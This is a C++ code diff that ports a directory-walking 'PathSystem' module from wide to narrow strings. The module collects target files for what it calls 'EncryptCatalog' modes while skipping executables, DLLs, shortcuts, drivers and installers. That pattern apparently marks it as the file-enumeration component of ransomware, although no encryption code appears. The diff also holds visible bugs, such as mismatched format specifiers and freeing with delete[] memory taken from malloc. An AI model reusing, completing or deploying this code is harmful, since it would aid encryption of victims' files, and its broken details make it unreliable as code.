@@ -15,15 +15,15 @@
 #include "pathsystem.h"
 #include "memory.h"
 
-bool PathSystem::check_filename(TCHAR* cFilename)
+bool PathSystem::check_filename(char* cFilename)
 {
-    CONST TCHAR* BlackList[]
+    CONST char* BlackList[]
     {
-        T(".exe"),
-        T(".dll"),
-        T(".lnk"),
-        T(".sys"),
-        T(".msi")
+        ".exe",
+        ".dll",
+        ".lnk",
+        ".sys",
+        ".msi"
     };
 
     size_t len = memory::StrLen(cFilename);
@@ -40,14 +40,14 @@ bool PathSystem::check_filename(TCHAR* cFilename)
 
     for (int k = 0; k < 5; ++k)
     {
-        if (memory::StrStr(&cFilename[i], BlackList[k]))
+        if (memory::StrStrC(&cFilename[i], BlackList[k]))
             return false;
     }
 
     return true;
 }
 
-TCHAR* PathSystem::make_exst(TCHAR* Filename)
+char* PathSystem::make_exst(char* Filename)
 {
     size_t len = memory::StrLen(Filename);
     int j = 0;
@@ -63,45 +63,45 @@ TCHAR* PathSystem::make_exst(TCHAR* Filename)
 
     if (i < 0)
     {
-        TCHAR* empty = (TCHAR*)memory::m_malloc(Tsize);
+        char* empty = (char*)memory::m_malloc(1);
         return empty;
     }
 
-    TCHAR* exst = (TCHAR*)memory::m_malloc((j + 1) * sizeof(TCHAR));
-    memc(exst, &Filename[i], j);
+    char* exst = (char*)memory::m_malloc((j + 1) * sizeof(char));
+    memcpy(exst, &Filename[i], j);
     return exst;
 }
 
-TCHAR* make_path(TCHAR* Filename, TCHAR* Directory)
+char* make_path(char* Filename, char* Directory)
 {
     size_t dir_len = memory::StrLen(Directory);
     size_t file_len = memory::StrLen(Filename);
-    TCHAR* str = (TCHAR*)memory::m_malloc((dir_len + file_len + 2) * Tsize);
+    char* str = (char*)memory::m_malloc(dir_len + file_len + 2);
 
-    memc(str, Directory, dir_len);
-    memc(&str[dir_len], slash, 1);
-    memc(&str[dir_len + 1], Filename, file_len);
+    memcpy(str, Directory, dir_len);
+    memcpy(&str[dir_len], slash, 1);
+    memcpy(&str[dir_len + 1], Filename, file_len);
     return str;
 }
 
 #ifdef _WIN32
-STATIC WCHAR* MakeSearchMask
+STATIC char* MakeSearchMask
 (
-    WCHAR* Directory,
+    char* Directory,
     size_t DirLen
 )
 {
-    std::wstring Path = Directory[DirLen - 1] == '/' ?
-        std::wstring(Directory) + std::wstring(L"*") :
-        std::wstring(Directory) + std::wstring(L"/*");
+    std::string Path = Directory[DirLen - 1] == '/' ?
+        std::string(Directory) + std::string("*") :
+        std::string(Directory) + std::string("/*");
     size_t PathLen = Path.size() + 1;
-    WCHAR* mask = (WCHAR*)malloc(PathLen * sizeof(WCHAR));
+    char* mask = (char*)memory::m_malloc(PathLen * sizeof(char));
     if (!mask)
     {
-        WCHAR* empty = (WCHAR*)memory::m_malloc(sizeof(WCHAR));
+        char* empty = (char*)memory::m_malloc(sizeof(char));
         return empty;
     }
-    wmemcpy_s(mask, PathLen, Path.c_str(), PathLen);
+    memcpy(mask, Path.c_str(), PathLen);
     return mask;
 }
 #endif
@@ -114,21 +114,21 @@ void PathSystem::search_files(LIST<DIRECTORY_INFO>* DirectoryInfo, int* cf)
     size_t DirLen = memory::StrLen(directory);
     
 #ifdef _WIN32
-    WIN32_FIND_DATAW FindData;
-    WCHAR* DirectoryMask = MakeSearchMask(directory, DirLen);
+    WIN32_FIND_DATAA FindData;
+    char* DirectoryMask = MakeSearchMask(directory, DirLen);
 
-    HANDLE hSearchFile = FindFirstFileW(DirectoryMask, &FindData);
+    HANDLE hSearchFile = FindFirstFileA(DirectoryMask, &FindData);
     if (hSearchFile == INVALID_HANDLE_VALUE)
     {
         printf_s("FindFirstFile fails in directory %ls. GetLastError = %lu.", directory, GetLastError());
         delete[] DirectoryMask;
         return;
     }
-
+    WCHAR* pointer = NULL;
     do
     {
-        if (!lstrcmpW(FindData.cFileName, L".") ||
-            !lstrcmpW(FindData.cFileName, L"..") ||
+        if (!lstrcmpA(FindData.cFileName, ".") ||
+            !lstrcmpA(FindData.cFileName, "..") ||
             FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)
         {
             continue;
@@ -139,24 +139,24 @@ void PathSystem::search_files(LIST<DIRECTORY_INFO>* DirectoryInfo, int* cf)
             DirectoryData->Directory = make_path(FindData.cFileName, directory);
             DirectoryInfo->LIST_INSERT_HEAD(DirectoryData);
         }
-        else if (CheckFilename(FindData.cFileName))
+        else if (check_filename(FindData.cFileName))
         {
-            WCHAR* cFilename = (WCHAR*)memory::m_malloc(260 * sizeof(WCHAR));
-            wmemcpy_s(cFilename, 260, FindData.cFileName, 260);
+            char* cFilename = (char*)memory::m_malloc(260);
+            memcpy(cFilename, FindData.cFileName, 260);
             PDRIVE_INFO DriveData = new DRIVE_INFO;
             {
-                DriveData->Filename = cFilename;
+                DriveData->Filename = cFilename;                
                 DriveData->Exst = make_exst(cFilename);
                 DriveData->FullPath = make_path(cFilename, directory);
-                WCHAR* Dir = (WCHAR*)memory::m_malloc((DirLen + 1) * sizeof(WCHAR));
-                wmemcpy_s(Dir, DirLen + 1, directory, DirLen + 1);
+                char* Dir = (char*)memory::m_malloc(DirLen + 1);
+                memcpy(Dir, directory, DirLen + 1);
                 DriveData->Path = Dir;
             }
             drive_info->LIST_INSERT_HEAD(DriveData);
             ++*cf;
         }
 
-    } while (FindNextFileW(hSearchFile, &FindData));
+    } while (FindNextFileA(hSearchFile, &FindData));
     FindClose(hSearchFile);
     delete[] DirectoryMask;
 #else
@@ -216,7 +216,7 @@ void PathSystem::qpath()
 
     size_t ec_f = q_paths.front().first;
     if(ec_f != 0)
-        ec = static_cast<size_t>(EncryptCatalog::AUTO_CAT) ^ ec_f;    
+        ec = static_cast<size_t>(EncryptCatalog::AUTO_CAT) ^ ec_f;
     directory = q_paths.front().second.get();
     f_count = 0;
 }
@@ -231,26 +231,26 @@ size_t PathSystem::start_local_search()
 
     if (ec == static_cast<size_t>(EncryptCatalog::FILE_CAT))
     {
-        int d = -1;
-        if((d = api::OpenFile(directory)) == -1)
+        DESC d = INVALID_HANDLE_VALUE;
+        if((d = api::OpenFile(directory)) == INVALID_HANDLE_VALUE)
         {
             LOG_ERROR("[start_local_search][FILE_CAT] Failed; " log_str, directory);
             return f_count = 0;
         }
         api::CloseDesc((d));
 
-        TCHAR* name = NULL;
-        TCHAR* path = NULL;
+        char* name = NULL;
+        char* path = NULL;
         size_t ld = memory::StrLen(directory);
         for (int i = ld - 1, j = 0; i >= 0; --i, ++j)
         {
-            if (directory[i] == T('/') || directory[i] == T('\\'))
+            if (directory[i] == ('/') || directory[i] == ('\\'))
             {
-                name = (TCHAR*)memory::m_malloc((j + 1) * Tsize);
-                memc(name, &directory[i + 1], j);
+                name = (char*)memory::m_malloc((j + 1) * Tsize);
+                memcpy(name, &directory[i + 1], j);
 
-                path = (TCHAR*)memory::m_malloc((i + 1) * Tsize);
-                memc(path, directory, i);
+                path = (char*)memory::m_malloc((i + 1) * Tsize);
+                memcpy(path, directory, i);
 
                 break;
             }
@@ -261,8 +261,8 @@ size_t PathSystem::start_local_search()
             DriveData->Filename = name;
         if (path)
             DriveData->Path = path;
-        TCHAR* fpath = (TCHAR*)memory::m_malloc((ld + 1) * Tsize);
-        memc(fpath, directory, ld);
+        char* fpath = (char*)memory::m_malloc((ld + 1) * Tsize);
+        memcpy(fpath, directory, ld);
         DriveData->FullPath = fpath;
         DriveData->Exst = make_exst(directory);
         drive_info->LIST_INSERT_HEAD(DriveData);
